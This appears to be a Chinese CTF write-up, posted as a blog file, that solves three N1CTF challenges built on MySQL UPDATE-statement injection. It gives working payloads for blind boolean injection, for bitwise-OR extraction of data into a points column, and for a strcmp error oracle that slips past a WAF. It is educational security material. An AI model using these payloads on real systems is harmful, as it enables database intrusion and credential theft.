@@ -1,0 +1,95 @@
+---
+title: LOVE Q
+date: 2018-05-04 00:00:00
+categories:
+- CTF/Web
+tags: N1CTF BCTF SQL注入 UPDATE注入
+--- 
+
+N1CTF的一道注入题的三个版本，注入点相同：
+
+![image](https://xuanxuanblingbling.github.io/assets/pic/n1sql.png)
+
+## 77777
+
+第一版，首先分析这个格式化字符串：
+
+```
+$q=sprintf("UPDATE users SET points=%d%s",$_POST['flag'],waf($_POST['hi']));
+```
+
+- flag这个位置最终通过%d格式化成数字，无法注入
+- hi这个位置虽然要经过waf函数，但最后是通过%s格式化成字符串的，也许可以注入
+
+这里我们发现每次提交给的flag值最终会在profile中的分数中显示出来，语句执行所以这里有两种思路：
+
+- 把要查询的数据转化成数字计算到points中
+- 通过能否成功更新points的值盲注
+
+> 盲注：
+
+```
+flag=0&hi=and ord(mid((select password where username = '77777'),1,1)) > 1
+```
+
+> 位或
+
+```
+flag=0&hi=|conv(hex(substr((select password),1,1)),16,10)
+```
+
+> flag
+
+```
+n1ctf{helloctfer23333}
+```
+
+## 77777 2
+
+一样存在回显，根据提示字段名称变成了pw，仍然是上面两总思路，但是发现盲注的函数彻底被waf了，于是只能尝试第二种方法。
+
+```
+flag=0&hi=|conv(hex(substr((select pw ),1,1)),16,10)
+```
+
+- 这里有很多的坑，首先是pw后面如果连上括号被waf
+- 另外是`2 3 4 5 9`这几个数字被waf了，所以可以用没过滤的数字算出来，1+1+1+1这种
+- 或者用length函数计算得出，length('11')==2
+- 一位一位的查看回显分值即可
+
+```
+hahah777a7aha77777aaaa
+```
+
+## LOVE Q
+
+第三版，将分数回显去掉了，hi参数过滤了一堆东西，最终发现位或运算并没过滤，数字2，9没有被过滤，利用mysql如下特性，并且strcmp比较可以返回(0,1,-1)
+
+```
+mysql> select (0|1),(0|0),(0|-1);
++-------+-------+----------------------+
+| (0|1) | (0|0) | (0|-1)               |
++-------+-------+----------------------+
+|     1 |     0 | 18446744073709551615 |
++-------+-------+----------------------+
+1 row in set (0.00 sec)
+```
+
+出现溢出错误，则返回中存在sorry字符串，构造payload，sorry前面的那个就是正确的值
+
+```
+flag=0&hi=|strcmp(substr(pw,9-2-2-2-2,9-2-2-2-2),'a')
+```
+
+最终通过各种9和2的组合替换substr的第二个参数，strcmp的第二个参数由a-z爆破，最终的得到flag:
+
+```
+flag{hhhhccchhddddahhhhhh}
+```
+
+但这里strcmp貌似是不区分大小的，所以这里走运全是小写
+
+## 参考
+
+[一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)
+
